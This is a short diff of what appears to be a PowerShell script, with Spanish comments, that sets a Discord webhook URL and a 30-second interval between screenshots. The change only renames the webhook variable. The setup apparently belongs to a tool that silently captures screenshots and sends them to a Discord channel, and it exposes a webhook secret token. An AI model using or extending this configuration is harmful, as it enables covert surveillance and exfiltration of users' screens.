@@ -1,5 +1,7 @@
 # Definir la URL del webhook de Discord
-$hookurl = "https://discord.com/api/webhooks/1203343432970539008/JjFQGyK8MZw2qySfc4jYTPw0jzsH2HKaKAaaQ27uyrllfMIVaDqEUi_ZywclJBmWpxJp"
+$dc = "https://discord.com/api/webhooks/1203343432970539008/JjFQGyK8MZw2qySfc4jYTPw0jzsH2HKaKAaaQ27uyrllfMIVaDqEUi_ZywclJBmWpxJp"
+$hookurl = $dc
+
 # Definir el intervalo de tiempo entre capturas de pantalla en segundos
 $seconds = 30
 
